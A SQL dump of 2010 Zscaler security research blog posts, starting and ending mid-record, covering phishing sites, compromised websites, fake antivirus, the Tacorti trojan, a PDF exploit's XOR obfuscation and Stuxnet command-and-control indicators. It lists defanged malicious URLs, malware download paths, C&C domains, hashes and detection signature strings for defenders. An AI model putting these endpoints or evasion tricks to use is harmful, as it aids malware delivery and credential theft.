e.g.,hxxp://upd.host255-255-255-0.com/upd/check?version=0.1unk&fxp=614a69d6edf1b0f55a0a07bfd613edb3cceeefa1b7223878206dc7870f0307bf6e496e69IP: 66.220.17.200hxxp://ayb.host127-0-0-1.com/abt?udata=WWW_9WWW:5.60www:%20140445784:United%20States:program_started:1cb20aef0c84a243IP: 66.220.17.154I’m in the process of sending something along to Hurricane Electric / Tucows/ DNSMADEEASY now, but you may want to check the logs in your environment for systems connecting to the mentioned domains.  Here\'s a continuation of the above list of recent Swizzor domains:', 'Malware', 'https://www.zscaler.com/blogs/research/6622017200-haven-swizzor');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (487, 'A Week Of Research', 'Julien Sobrier', 'August 24, 2010', 'This post is a little bit different from what I usually write. Rather than explaining one topic, I\'d like to provide insight into what we uncover during a typical week of research. Here are some of the malicious pages that I found this week during some research not related to spam SEO.PhishingFacebook phishing pages are showing up regularly. I uncovered an Italian phishing page at hxxp://facebookentry.altervista.org/. The page looked exactly like the Facebook login page, but all the links produce a blank page. It looks like the author focused on getting the main page right, but did not bother to create fake links. Anyway, I guess most  people will fill out the form right away and will not check the links.This page has been up for more than a week.Italian Facebook Phishing pageAnother Facebook phishing page that I uncovered was hosted at hxxp://www.facebookconfirmation.com/ - a great domain name! I have not seen this login or \"confirmation\" page anywhere on Facebook, but I\'m sure it fooled many people. The domain is registered bin Russia.Fake Facebook confirmation pageFake antivirus vendorhxxp://generalavs.com/ looks like an online store for antivirus. You are invited to try their software for free, and you must even accept their \"Terms and Conditions\". The executable GeneralAntivirus4.exe which a user is prompted to download, is actually a virus. Fortunately, it is detected by 90% of the AV vendors.Fave AV online storehxxp://bulletproofsoft.com/ is a similar malware site, but it has more than 10 executables for download. The detection rate among AV vendors is much lower at about 40%.Malicious sites for downloadThese are examples of all the malicious sites that are out there. Once again, using Google Safe Browsing (with Firefox, Opera, Safari) or SmartScreen filters (Internet Explorer) does not help. None of these sites were flagged. They have been up for several days, probably weeks, and may not be taken down any time soon.Antivirus can help to protect against some malware, but they are not a silver bullet.-- Julien', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/week-research');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (488, 'Union Public Service Commission Website Of India Compromised', 'ThreatLabz', 'August 19, 2010', 'My previous blog discussed the injection of malicious JavaScript into the html/JS pages of a Red Cross website. This time victim of similar attack is an Indian government website, namely http://upsc.gov.in/ .    Screen-shot of the UPSC homepage:             Tried to send notification on certain email address found while doing look up on domain name, but messages were rejected.         For those not aware, Virustotal has now launched new functionality that permits you to submit URLs, which will then be checked against popular blocklists. The result for this site shows that none of the lists have yet detected the infection. Additionally, if you submit malicious HTML file, only 8/41 AV engines identify it as malicious.         Pradeep', 'Compromise', 'https://www.zscaler.com/blogs/research/union-public-service-commission-website-india-compromised');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (489, 'More Chinese Phishing Sites', 'Julien Sobrier', 'August 18, 2010', 'in a previous post, I talked about the QQ phishing sites targeting chinese users. There is another popular type of Chinese phishing: Yahoo! Auctions lotteries. Yahoo Auctions is more popular than eBay in China.\r\n\r\n \r\n\r\nThese phishing sites claim that Yahoo users have won a gift, and that they need to login with their Yahoo! Auctions credentials to claim their reward. Like the QQ Reward phishing pages, these fake sites look all the same.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake yahoo Auction lottery page\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\nThese sites were not flagged by Google SafeBrowsing or Phishtank. One of them, hxxp://ccyahoo.in/, is now down. But others are still live: hxxp://yahoo.uu2010.in/index.asp, hxxp://ye.163.to/, etc.\r\n\r\n \r\n\r\nLanguages in Phishtank\r\n\r\n \r\n\r\n\"PhishTank is a collaborative clearing house for data and information about phishing on the Internet.\" (from their website). The site maintains a public list of phishing URLs. Since none of the Chinese phishing sites were included in Phishtank, I was wondering if the list was centered on english phishing sites only.\r\n\r\n \r\n\r\nI used the Google Ajax Language API to verify the language of each Phishing page. 90% of the phishing pages still reachable are in English. Number 2 is French, with 6% of the list.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nLanguages in Clean-MX\r\n\r\n \r\n\r\nAnother public list of phishing sites is provides by clean-mx.de. It contains about 3,500 URLs versus the 250 of Phishtank.\r\n\r\n\r\n\r\n\r\n\r\n\r\nThe Clean-MX list contains 80% English phishing sites. There were only 6 Chinese pages out of 2,158. I am not aware of any public phishing list focused on Chinese language, but it would appear that one is warranted.\r\n\r\n-- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/more-chinese-phishing-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (490, 'QQ Phishing Sites Stay Under The Radar', 'Julien Sobrier', 'August 16, 2010', 'In April, Mike reported an increase of QQ phishing sites. This does not come as a surprise, QQ is the equivalent of Google + eBay + Paypal in China. QQ first started as an Instant Messaging site and has now evolved as a Chinese web giant, with e-mail, search, online auctions, online payments, etc.QQ Security Center The main target here is the QQ Security Center aq.qq.com, which is used, among other things, to retrieve lost passwords, confirm account ownership, etc. The phishing sites are exact copies of the original site.Most of the sites spotted are still live, and not blocked by Google Safe Browsing or Phishtank:hxxp://www.qqaq.info/hxxp://aq.qq.com.inddexx.com/hxxp://aqq.txfree.net/aq/hxxp://aq.qq.com.cgi-get.tencant.com.cn/hxxp://aq.qq.sevrivae.cn-indvx.com/index.asphxxp://qq2010hd.h7.8210.cn/qq/88.htmPhishing site hxxp://www.qaq.info/QQ RewardsThe other popular QQ phishing target is the Reward Center, where QQ rewards users for using their services. Fake QQ Reward Centers attempt to steal user credentials. Like for the QQ Security center scam, all phishing pages are nearly identical, and not detected by Phistank or Google SafeBrowsing.QQ Reward phishing pageSome of the phishing pages are:hxxp://ctqq.in/qq/hxxp://asdsdf.ns3.lianfa.info/qq2010/hxxp://1111aaaa.01kro.idcqq.net/3/ hxxp://qqtx08.tk/hxxp://nghfyu585.us3.hg288m.com/qq1/ etc.hxxp://qqtx08.tk/ QQ phishing siteI\'ve seen only one QQ phishing site flagged by Google Safe Browsing while reviewing more than 20 QQ phishing sites, and the domain was already down: hxxp://qqli.go.3322.org/-- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/qq-phishing-sites-stay-under-radar');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (491, 'Red Cross Hacked Again!!!', 'ThreatLabz', 'August 12, 2010', 'It seems as though attackers are fond of Red Cross sites as this isn’t the first time that we’ve blogged about a compromised Red Cross site. The victim this time was the Red Cross of Serbia. Previously, they hacked the site by simply injecting a malicious iframe. Injecting malicious content into static pages on the server side seems to be an emerging trend. Let’s analyze how it was done this time.    Screen-shot of the homepage:    Screen-shot of “http://www.redcross.org.rs/” source code:        Some of the infected JavaScript files are,  http://www.redcross.org.rs/java3/menu_common.js  http://www.redcross.org.rs/java3/menu123.js  http://www.redcross.org.rs/java3/fw_menu.js         A simple Google search on the domain “obscurewax.ru” suggests that this domain has been used in other attacks as victims can be seen discussing similar injected code on various forums and similar files have been submitted to online malware analyzers. We have also observed that many sites are still infected by the same malicious script. For example, “http://www.myasianroots.com/, where the same malicious script is inserted at the bottom of the webpage.         Although the injected JavaScript file “hxxp://obscurewax.ru/Kbps.js” is no longer accessible, this same file has appeared on other domains. Even though the malicious code is no longer being delivered, it is possible that the vulnerability that led to the attack has not yet been patched and further infection could occur, or the existing malicious content could become active once again. Notifications are being sent to Redcross.         Pradeep', 'Compromise', 'https://www.zscaler.com/blogs/research/red-cross-hacked-again');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (492, 'Spam SEO And Adware', 'Julien Sobrier', 'August 11, 2010', 'It seems that Blackhat spam SEO is getting more and more effective, allowing attackers to spread malware and adware. Spammers can now easily infect thousands of websites in order to rank high in popular searches and trick users into surfings to their malicious pages.    Attackers are never short of ideas for disguising their malware or adware as legitimate software. While following some of the spam links I recently discovered, I stumbled upon a free video site which attempts to get users to install both the Zango and LoudMo adware.    First, an ad for VLC, a popular open-source video player, pops up. However, the executable downloaded is actually Zango adware. Only 8 antivirus vendors out of 42 find this particular piece of adware. This malicious file is only 20KB, compared to the official, and clean,  18.6MB official executable file for VLC.         	  		  			  		  		  			This VLC executable comes with a spyware  		  	      Then, at another site, in order to watch a movie, a user is prompted to download the Bing toolbar. This download however actually contains the Loudmo spyware (caught by only 10 antivirus vendors) that I  had mentioned in a previous post.         	  		  			  		  		  			Second attempt to install an adware  		  	      As always, users should be aware to not download any software outside of official websites, and should not rely on their antivirus to sort out the bad from the good.    These adware attacks are a major source of revenue for websites that distribute copyrighted material such as pirated novies, as they cannot participate in legitimate advertising networks. I\'ve found several websites offering free movie downloads which linked to these 2 sites.    -- Julien', 'Malware;Phishing', 'https://www.zscaler.com/blogs/research/spam-seo-and-adware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (493, 'SEO Spam Attacks Are Getting Harder To Spot', 'Julien Sobrier', 'August 05, 2010', 'Spam SEO pages used to be very easy to spot: no Javascript, no style sheets, no images, etc. and  usually just a single link. They only text on the page relevant to the spam was generally a set of short paragraphs, as shown below:         	  		  			  		  		  			Typical old-style SEO spam page  			  			   			Recently however, these pages have been changed to look more like a regular web page. They look like a web page taken out of a news site, with multiple columns, images, links to legitimate sites, Javascript, etc. You have to look closer to realize that the text does not make sense - words are cut in the middle, images are not related to the content, and the style is not quite right (misalignment, overflows, etc.)  			  		  	             	  		  			  		  		  			New style of SEO spam pages on the hacked site brooklyngoesveg.com  		  	      These pages are much harder to recognize as computer-generated spam. At first glance, they look like legitimate pages. Fortunately, spammers still use the same type of URLs. The screenshot above was taken from hxxp://www.brooklyngoesveg.com/xmlrpc.php/?showc=williams+syndrome, where the search term \"Williams syndrome\" is part of the query string.    Another common layout for spam pages mimics MTV\'s website:      	  		  			  		  		  			Spam page looks like MTV\'s site  		  	             Spammers and attackers are constantly innovating to stay under the radar.  This is another step to hide their malicious intent from the search engines.    -- Julien', 'Spam', 'https://www.zscaler.com/blogs/research/seo-spam-attacks-are-getting-harder-spot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (494, 'Analysis Of Recent \"Trojan Tacorti\" Malware Run', 'ThreatLabz', 'August 04, 2010', 'The past few weeks I noticed a handful of \"free access\" / \"open for free access\" malware binary executables.  There was some information in the open source about this, but not much piecing the entire picture together - in fact, it appears that there could be a linkage to the Koobface gang for this.  Read on for more details...Of late the binaries have mostly been named \"Open.Me.For.free.Access1.1.exe\"For example, (all live at the moment, not blocked through Google SafeBrowsing)fu0ckpisingebonun.com/Open.Me.For.free.Access1.1.exeg1rlyuoung.com/Open.Me.For.free.Access1.1.exe1000sweeties.com/Open.Me.For.free.Access1.1.exewww.baabbeesss.com/Open.Me.For.free.Access1.1.exe69poses4u.com/Open.Me.For.free.Access1.1.exeThere have been a number of other domains registered for this campaign.  All sites lure the victims through porn, and are advertised via web and email spam.   Clicking on any of the links in the page entices the user to download the binary.  Fortunately, the binary remains static in each run.  In this particular example the binary has ok A/V detection, V/T results 27/42, MD5: 76553a8e67d22c40fabd52cb57d30ea4The malware uses a browser helper object (BHO) to automatically access and inject content into the victims browser.  The malware accesses and injects content into the victim\'s browser from adult site affiliates, for example, streamray.com and cams.com.In a previous blog post, I mention the Partnerka (Russian slang for the affiliate networks).  These affiliate programs provide a revenue stream for spammers, SEOers, and malware authors alike based on pay-per-etc.,etc. (traffic volumes, clicks, purchases, installs, credential / sign-up).  In other words, the malware from this post is being used to monetize adult site affiliate programs such as the Cams / Streamray affiliate.Variants of the malware from this post have been classified as \"Trojan Tacorti\" by some vendors.  Here is an example of a ThreatExpert report from a previous Tacorti run -- the possible country of origin from the artifact is identified as Russia.The resolving IP for the above Tacorti domains is: 62.219.250.70 with nameservers on the same IP block:Name Server : NS1.CUM4ME.TV  (62.219.250.67)Name Server : NS2.CUM4ME.TV  (62.219.250.67)All of the Tacorti domains were registered through:Registrar: GAL COMMUNICATION (COMMUNIGAL) LTD.With private whois info, contact to unmask:domainprivate@communigal.comThe nameserver domain was registered through:Registrar: REGISTER.COM, INC.With private whois info through Domain Discreet(I sent notification to the appropriate parties for the nameserver domain)IP Info:70.250.219.62.in-addr.arpa. 86400 IN PTR bzq-219-250-70.static.bezeqint.net.67.250.219.62.in-addr.arpa. 86400 IN PTR bzq-219-250-67.static.bezeqint.net.inetnum:        62.219.250.64 - 62.219.250.127netname:        WADACH-WATZPI-LTDperson:       Zehavit Vigderaddress:      bezeq-internationaladdress:      40 hashachamaddress:      petach tikva 49170 Israelphone:        +972 1 800800110fax-no:       +972 3 9203033e-mail:       hostmaster@bezeqint.netroute:        62.219.224.0/19descr:        BEZEQ-INTERNATIONALorigin:       AS8551AS8551 is shown to be a fairly \"dirty\" AS, with a history of hosting Koobface malware, see malwareurl.com report.  There is no conclusive evidence at present to link the Trojan Tacorti runs to the Koobface gang, but the modus operandi (MO) is similar to this gang (monetizing affiliate networks through malware infections ... and they have a history of porn / web cam / video as the social engineering lure for victims).', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/analysis-recent-trojan-tacorti-malware-run');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (495, 'PDF Exploit: Number Of Pages Is The Key', 'ThreatLabz', 'August 04, 2010', 'PDF exploits targeting a number of recent Adobe vulnerabilities exist in the wild. In the past, we have seen number of different obfuscation and decoding techniques being used by the exploits to avoid anti-virus detection. Increasingly, PDF exploits are becoming more and more sophisticated. Recently, we came across one PDF exploit which appeared to be targeting recent Adobe vulnerabilities, but it wasn’t clear which ones. Interestingly, the attacker had used a key to decode his malicious code. Here is the screenshot of malicious encoded JavaScript inside the one of the objects within the PDF file,    I decoded this suspicious object using the pdf-parser tool and found obfuscated JavaScript code inside. Here is what the decoded code looked like:    The code is heavily obfuscated to hide the actual exploit code. There were 2 calls to the “eval()” function. The first one extracted one variable (i.e. K9U8Zm8NS4) from another (i.e. KeNJ148) which is then XOR’ed with 2 other variables which are nothing but some secret key values. Confused? Hang tight. After that there is a call to a “String.fromCharCode” function on the final XOR’ed variable (i.e. e208xh). After initial analysis of the code, I pasted the code into Malzilla to see the final output of the obfuscated JavaScript code and found that Malzilla was unable to decode it. Something wasn’t going right for Malzilla.    I figured it out that there are some strings or function like “this.numPages” used inside the code and because of that, Malzilla was unable to decode it. If you observe, this is the first key (i.e. l46bQ8A) which is used to XOR with the original variable (i.e. e208xh). I changed the variable which was using the “this.numPages” function manually to integers such as 1, 2 etc. and tried decoding it once again. Finally, Malzilla started decoding it but the output was still not legible – I’d clearly missed some additional decoding routines. I then realized that there were 2 keys being used for XORing - one was hard coded with value “189” while the other was taking a value from the “this.numPages” function. This function returns the number of pages present inside the PDF file. That means whatever values I was passing to the variable manually, wasn’t correct and the script was unable to decode it. I re-opened the PDF file to search for object which contained the number of pages used inside the PDF and found the exact count,             There are “20” pages inside this malicious PDF file and this is turned out to be the first key which was used for XORing with the original variable. Now I changed the variable value to “20” and tried to decode the JavaScript. Finally, everything went according to plan and malzilla decoded the JavaScript into readable code. This was a rather unique trick used by the attacker to encode/decode the malicious JavaScript leveraging the “this.numPages” function. Once that challenge was solved, the rest was easy to understand as the skeleton of the final code was using a familiar heap spray technique and targeting known Adobe vulnerabilities. Here is the final decoded JavaScript:               The exploit was targeting 3 different vulnerabilities.    1) mediaNewplayer CVE-2009-4324    2) collectEmailInfo CVE-2007-5659    3) CollabgetIcon CVE-2009-0927    The detection for this PDF file remains very poor. Here is the Virustotal result for this file – currently, only 6 of 42 AV vendors detect it. This is a really interesting case as the “key” is actually a component of the PDF file and this is deliberately used by the attacker so that the manual decoding becomes difficult for researchers. Even Webpawet failed to decode it properly. This time attacker has used “number of pages” inside the PDF as a key to decode the malicious script code. I expect that we’ll see similar tricks going forward.    What’s your key?    Umesh', 'Exploit', 'https://www.zscaler.com/blogs/research/pdf-exploit-number-pages-key');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (496, 'SEO Spammers Go After Firefox Users', 'Julien Sobrier', 'August 02, 2010', 'Most malicious pages used in spam SEO attacks target Windows users, by showing what looks like a Windows Antivirus screen running, or Internet Explorer with pages displaying fake IE warnings about outdated flash versions or missing video codecs.    But attackers are now disguising their malicious executables as Firefox updates. The malicious pages use the same theme as the official Firefox website - same background, images, etc.         	  		  			  		  		  			Malicious page warn about outdated Firefox version  		  	      At the time of writing, the site is not blocked by Google Safe Browsing, and the detection rate of the malicious executable ff-update.exe is very low: only 6 antivirus vendors out of 42 find it to be malicious.    Our new Firefox extension Search Engine Security does protect against this attack and most other spam SEO threats. You can install it by clicking on the image below:                  If you use Internet Explorer, you get redirected to a different domain with the \"usual\" fake AV screen.                	  		  			  		  		  			Fake AV page for Internet Explorer users  		  	      Attackers are widening their range of targets, and keep innovating to find more potential victims.    -- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/seo-spammers-go-after-firefox-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (497, 'New Firefox Add-on To Protect Against Blackhat Spam SEO', 'Julien Sobrier', 'July 30, 2010', 'There are currently no ultimate solutions for end-users to protect themselves against fake AV pages, fake videos and other malicious spam SEO: antivirus have a low detection rate, blacklist (such as Google Safe Browsing) lag behind the creation of new malicious domains.\r\n\r\nIn a previous post, I pointed out the vast majority of malicious spam SEO sites check the referrer string of the visitor. If this string does not include bing.com, yahoo.com or google.com, the user is not redirected to a malicious page.\r\n\r\nWe are releasing a Firefox add-on that uses this trick to protect Firefox users against most spam SEO threats, including fake AV and fake Video pages. This plugin works with Firefox 3.x. Click on the image below to install it. It is called \"Search Engine Security\".\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Search Engine Security add-on installed\r\n		\r\n	\r\n\r\n\r\n\r\nHow it works\r\n\r\nThis Firefox add-on handles Bing, Yahoo and Google search engines, in all languages. Normally, if a user clicks on a link within search engine results, the HTTP request to the external site contains a Referrer string from the search engine within the HTTP header. For example, if a user searches for \"this is a test\" in Google, any request to a search result will include the following Referrer:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nReferer: http://www.google.com?q=this+is+a+test&hl=en&safe=active\r\n\r\nFor these requests, the add-on changes the Referrer header to a different value. This means that the requested page does not know that a given request came from a Google, Yahoo or Bing search. This is critical as Blackhat SEO pages only deliver malicious content (fake AV, Flash/Java updates, codecs, etc.) when requests come from the SEO results. Changing the Referer header, breaks the attack.\r\n\r\nThe add-on does not change the referrer if you navigate within the same site (for example, inside google.com), or if your Referrer does not include a Bing, Yahoo or Google domain.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\nConfiguration\r\n\r\nYou can customize the behavior of the Search Engine Security add-on. In the preferences menu, you can change the following values:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Search Engine Security preferences\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n-Protect\r\n\r\nSelect the search engines for which you wish to enable protection.\r\n\r\n- Use Referer header\r\n\r\nChoose the Referer value to use for overriding the Google/Bing/Yahoo Referer. You can use an empty value, but it is recommended that you use a valid URL.\r\n\r\n- Modify User-Agent (NEW in 1.0.8)\r\n\r\nMost spam pages look at the Referrer value to decide whether or not to redirect users to a malicious page. However, in some cases like the Hot Video pages, only the User-Agent value is used. One common check is to look for \"slurp\" in the user-agent string to flag the request as coming form the Yahoo crawler. If you check the \"Modify User-Agent\" checkbox in the options, the string \"slurp\" is added to the User-Agent header when you leave Google/Bing/Yahoo in addition to overriding the Referrer header.\r\n\r\nThis option provides additional protection against malicious spam SEO.\r\n\r\n-Whitelist\r\n\r\nSome websites display a different page if you come from a search engine. When you use this add-on, the websites can no longer detect that you come from Google/Yahoo/Bing. If you are sure that a website is safe, you can add it to the whitelist. This will disable the add-on for this website.\r\n\r\nIf the URL matches any of the elements in the whitelist, the add-on does not change the Referer value. This is a string match and the match occurs if the URL includes one element of the whitelist. For example, http://www.expert-exchange.com/ can be whitelisted by adding:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	http://www.expert-exchange.com/ (also matches http://www.expert-exchange.com/foo)\r\n	expert-exchange.com/ (matches any subdomain)\r\n	expert-exchange. (matches the domains expert-exchange.net, expert-exchange.org, and paths like http://example.com/expert-exchange.html/)\r\n	etc.\r\n\r\n\r\n\r\nNotification (NEW in 1.0.4)\r\n\r\nA notification is shown on Bing, Yahoo, and Google to let users know whether the SES protection is enabled for this search engine. The notification is shown under the search input.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Search Engine Security notification in Google search\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Search Engine Security notification in Bing search\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nIf you find any problem with this add-on, please let me know at jsobrier@zscaler.com.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\n-- Julien', 'Abuse', 'https://www.zscaler.com/blogs/research/new-firefox-add-protect-against-blackhat-spam-seo');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (498, 'Fake AV: New Look & Feel', 'Julien Sobrier', 'July 27, 2010', 'I recently stumbled upon a new type of fake AV page. This one looks like the store front of an anti-virus vendor.      	  		  			  		  		  			New fake AV look & feel  		  	      The page is animated and displays a fake AV scanner in action. At the end of the animation, the user is warned that several viruses were found on the user computer and the page attempts do download a fake anti-virus binary named: antivirus.exe. Strangely, the \"Download for free\" image is not clickable.      	  		  			  		  		  			Popup is followed by an attempt to download fake antivirus  		  	      The page is hosted on scanerzone.cz.cc. At the time it was found, neither Google Safe Browsing (Firefox, Safari, Chrome) or Internet Explorer SmartScreen filter block the page. The malicious executable is detected by 12 antivirus vendors out of 42.I was lead to this page through a spam SEO link in a Google search. However, unlike most other fake AV pages, direct access to the page displays the fake antivirus page. A similar page can be found on bestmalwarescaner.cz.cc, the domain is currently blocked by Google Safe Browsing.     -- Julien', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/fake-av-new-look-feel');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (499, '.LNK (CVE-2010-2568) / Stuxnet Incident', 'ThreatLabz', 'July 21, 2010', 'We’ve had a number of inquiries regarding the .LNK (CVE-2010-2568) vulnerability and related Stuxnet malware. There are a number of stories (for example, CNET) that detail the timeline of events and the SCADA angle to the attacks. Being a SaaS vendor focusing on web-based threats and having the powerful ability to do post-incident web log forensics, I wanted to share information on what we saw.    Detections:    Conducting web log forensics, we detected a small number of Stuxnet infected machines calling out to known C&C servers. None of the impacted machines appear to be running SCADA or industrial equipment.    We are sharing the below information to facilitate detection and analysis for other security operations centers (SOCs) and the like.    The date of all of the infected transactions observed was on July 12.    C&C Server: www.mypremierfutbol.com  Server IP: 78.111.169.146  URL Sample: www.mypremierfutbol.com/index.php?data=66a96e28<redacted>  Request Type: GET      	Only one transaction was observed to the C&C per infected machine.  	The request size varied depending on the data parameter.  	The response size was always 24,778 bytes in the observed transactions.  	The user agent string varied among Microsoft Internet Explorer versions (to include MS IE 8).  	The transaction to the C&C was observed immediately following a transaction to MSN or WindowsUpdate.      The URL data parameter always began with “66a96e28” in the observed transactions – the remainder of the data string has been redacted to protect the victim information. The exact details of the data string is currently unknown, however it is likely to contain encoded details about the victim – such as Windows version, host name, account name, and possibly whether the Siemens WinCC or PCS7 software is running.    Organizations that have the ability to, should conduct similar log analysis, and respond to any identified infections.    In-Line Protections:    The following are in-line protections that an enterprise can and should have in place to protect its users against this threat.    Blocks against known C&C servers including:      	mypremierfutbol.com  	todaysfutbol.com        In-line anti-virus signatures in place and tested against known related malware artifacts. For example, MD5s:           	743E16B3EF4D39FC11C5E8EC890DCD29F (Stuxnet)  	15db99383d46d790812e83df6196f4fd (SuckMe LNK PoC)        Signatures deployed for traffic that may mimic past observed C&C activity, for example,                	In URL: “index.php?data=66a96e28”        As well as signatures to detect the Metasploit WebDAV .LNK exploit.    Additionally, if appropriate or available organizations can deploy technologies to identify, parse, and/or block LNK files entering their organization.    Local Protections:    There is not currently a patch, though Microsoft has issued a work around detailed here.    Didier Stevens, a security researcher, has released a tool and screenshots on his blog about how to apply protections locally to prevent against LNK exploitation.    Conclusion:    This vulnerability has been, is being, and will continue to be exploited in the wild. Use the above information to conduct log forensics and analysis to identify and respond to infected systems. Apply appropriate in-line and local protections as appropriate within your environments.', 'Analysis;APT;Malware', 'https://www.zscaler.com/blogs/research/lnk-cve-2010-2568-stuxnet-incident');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (500, '\"Spyware And Virus Free\" - Really?', 'Julien Sobrier', 'July 19, 2010', 'Most of the non-malicious spam that we see in search results relates to fake search engines. The operators of these sites make money by tricking users into clicking on disguised advertising. Another way they make money is to convince users to install adware onto their computers as they will then receive a fee from the adware vendor.    For example, LoudMo is a well-known adware vendor. Their affiliate network pays $1.50 per installation.            LoudMo\'s adversting on their main page      Spammers don\'t hesitate to trick users into downloading such adware. They hack legitimate web sites to pollute Google search results, and then redirect users to fake video pages.                                      Fake video         Clicking on the \"video\" (actually a simple image) warns the user that the \"Latest version of FLVDirect Video Player not found! Click OK to install the FREE FLVDirect Video Player latest version.\"             Prompt to download a video player         The user gets redirected to an external site where he can download the video player. This player is guaranteed \"spyware and virus free\".  This does not mean adware free! 20 antivirus vendors find something dangerous about the executable, 5 flag it as an adware.                  Guaranteed \"spyware and virus free\"!      -- Julien', 'Data Breach;Malware', 'https://www.zscaler.com/blogs/research/spyware-and-virus-free-really');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (501, 'Placeblogger And Others Lead To Imgwebsearch Spam', 'ThreatLabz', 'July 19, 2010', 'Over the weekend I was playing around with the iPad application SkyGrid to read the latest news stories on particular subjects. In one of my feeds that I setup for mobile security I saw a story with the title \"GvHpMqAVt.\" From the title I immediately suspected the story as spam (can\'t seem to go anywhere these days without running into some type of spam on the web). The page has nothing on Blackberry or mobile security which was my topic on SkyGrid - but there was one link on the page for \"streaming porn on blackberry pearl\" - not really the subject I was looking for. The page is a spam advertisement page to multiple affiliate pages advertising various porn and dating sites. Figured I\'d write a brief blog post to detail this campaign:\r\n\r\nPlaceblogger spam page:\r\n\r\n\r\nClicking any of the links takes you to the affiliate page (this one is setup on Quogger but there are a large number of social media sites used for this):\r\n\r\nIt didn\'t take long from here to start to unravel the web of spam and affiliate pages setup to monetize porn and dating service pay-per-clicks / pay-per-purchase.\r\n\r\nSome Placeblogger spam pages:\r\nhxxp://placeblogger.com/content/gvhpmqavt\r\nhxxp://placeblogger.com/content/rrvlxrrhjpnt\r\nhxxp://www.placeblogger.com/content/tvkbzvxrmydrdmtlit\r\nhxxp://placeblogger.com/content/hnuxlavx\r\nhxxp://placeblogger.com/content/efvwiokczlmffeeugnt\r\nhxxp://placeblogger.com/content/tipsgyxr\r\nhxxp://placeblogger.com/content/lxyyfrohukysmzev\r\nhxxp://placeblogger.com/content/frbonuntjf\r\nhxxp://placeblogger.com/content/dnlnfbbkmfvcxga\r\nhxxp://placeblogger.com/content/hsgsqurgd\r\nThe list goes on...\r\nThis Google search identifies about 300 or so for example.\r\n\r\nSome Affiliate / Advertisement pages:\r\nhxxp://www.quogger.com/pg/profile/AassidyWood49\r\nhxxp://silentzow.com/elgg/pg/profile/AaydaThompson01\r\nhxxp://www.yappey.com/pg/profile/AharlizeMiller59\r\nhxxp://jivebook.co.uk/main/pg/profile/AreannCook29\r\nhxxp://www.quogger.com/pg/profile/ArynnJames38\r\nhxxp://www.swakiya.com/pg/profile/AaylaHayes00\r\nhxxp://socialcommerce.in/pg/profile/AryannaDoyle28\r\n~ snip ~\r\nNote: there are a lot more affiliate pages - about 10 per Placeblogger spam page. Most of these are profile pages on a variety of social media sites.\r\n\r\nMost of the affiliate links direct the visitor through imgwebsearch.com. A search for this site uncovers a large number of spam links to a variety of campaigns including: porn/dating, pharma, casinos, loans, replicas, etc., etc. Imgwebsearch spam shows up everywhere - yes, including Facebook. An example of imgwebsearch pharma spam on Facebook:\r\nhxxp://www.facebook.com/pages/Com-Program-ahdth-bramj-alkmbywtr/277890114062\r\nActually, this Google search shows over 600 some related spam pages on Facebook.\r\n\r\nHow does this work?\r\n\r\nHere is an example of one such related spammer detected via Project HoneyPot. In this case the spammer / spam group seems to have one or more netblocks (94.142.131.0/24 in Latvia for example) with the hosts setup to spider the web and post comment spam to sites (infected machines / bots may be used or rented out for this purpose as well). In this case all of the spammer\'s links were through imgwebsearch. The pool of source IP addresses for spidering / spamming and the changing of the user-agent is used to evade detection. This relatively simple spam operation could be home grown by the spammer(s), or there are relatively inexpensive tools such as XRumer for purchase to facilitate this type of spam (also used for SEO). This and other tools provide account creation / CAPTCHA bypass to be able to spam to sites that require account / login. Affiliate programs (aka Partnerka in Russian slang) -- in this case it appears to be 